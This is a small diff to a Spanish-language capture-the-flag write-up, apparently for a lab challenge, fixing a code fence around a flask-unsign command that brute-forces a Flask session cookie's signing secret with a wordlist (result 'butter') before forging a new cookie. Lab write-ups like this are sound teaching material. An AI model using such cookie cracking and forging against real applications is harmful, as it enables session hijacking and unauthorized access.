@@ -7,7 +7,7 @@ Con ayuda de burpsuite se aprecia que se envían las cookies cifradas, cuando se
 Entonces ahora lo que hay que hacer es que con ayuda del script py donde se tienen las galletas se debe iterar por renglones y usar la herramienta flask unsign
 Se ingresa el siguiente comando en la terminal
 ```
-flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_DZcw.vN744w-0M44yaR1dxcNIVHUG0vI" --wordlist cookies.txt```
+flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_DZcw.vN744w-0M44yaR1dxcNIVHUG0vI" --wordlist cookies.txt
 ```
 Da como resultado `butter`
 Se hace la nueva cookie con el siguiente comando
